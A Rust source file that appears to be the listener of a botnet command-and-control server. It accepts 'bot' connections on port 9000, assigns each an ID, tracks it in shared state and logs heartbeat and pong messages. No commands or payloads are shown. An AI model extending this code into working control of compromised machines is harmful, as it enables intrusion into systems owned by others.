// src/communicating/handler.rs


use std::sync::Arc;
use tokio::net::TcpListener;
use anyhow::Result;
use uuid::Uuid;
use tokio::sync::Mutex;
use crate::core::state::ServerState;
use crate::communicating::types::BotConnection;

pub async fn start_bot_listener(state: Arc<ServerState>) -> Result<()> {
    let listener = TcpListener::bind("0.0.0.0:9000").await?;
    println!("[*] Listening for bot connections on 0.0.0.0:9000...");

    loop {
        let (stream, addr) = listener.accept().await?;
        println!("[+] New bot connected from {}", addr);

        let bot = BotConnection {
            connection: Arc::new(Mutex::new(stream)),
        };

        let bot_id = Uuid::new_v4();

        state.bots.lock().await.insert(bot_id, bot.clone());

        println!("[+] Bot assigned ID: {}", bot_id);

        // Spawn per-bot task to handle incoming messages
        let state_clone = state.clone();
        tokio::spawn(handle_bot(bot_id, bot, state_clone));
    }
}

async fn handle_bot(bot_id: Uuid, bot: BotConnection, state: Arc<ServerState>) {
    loop {
        match bot.read_message().await {
            Ok(msg) => {
                let message = msg.trim();
                match message {
                    "HEARTBEAT" => println!("[♥] Bot {} heartbeat received.", bot_id),
                    "PONG" => println!("[🏓] Bot {} responded with PONG.", bot_id),
                    other => println!("[?] Bot {} sent unknown message: {}", bot_id, other),
                }
            }
            Err(_) => {
                println!("[-] Bot {} disconnected.", bot_id);
                break;
            }
        }
    }
    state.bots.lock().await.remove(&bot_id);
}
